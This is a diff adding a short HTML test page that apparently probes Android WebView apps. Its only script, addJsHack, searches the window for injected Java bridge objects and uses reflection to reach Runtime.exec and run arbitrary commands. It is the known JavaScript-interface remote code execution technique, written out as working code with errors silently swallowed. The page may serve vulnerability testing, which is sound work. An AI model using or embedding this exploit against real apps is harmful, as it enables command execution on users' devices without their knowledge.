@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>测试WebView页面</title>
+</head>
+<body>
+
+<script>
+    function addJsHack(cmdArgs){
+    for (var obj in window)
+    { try {
+            if ("getClass" in window[obj]) {
+                try{
+                    window[obj].getClass().forName("java.lang.Runtime").
+                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);;
+                }catch(e){
+                }
+            }
+        } catch(e) {
+        }
+    }
+}
+
+</script>
+</body>
+</html>
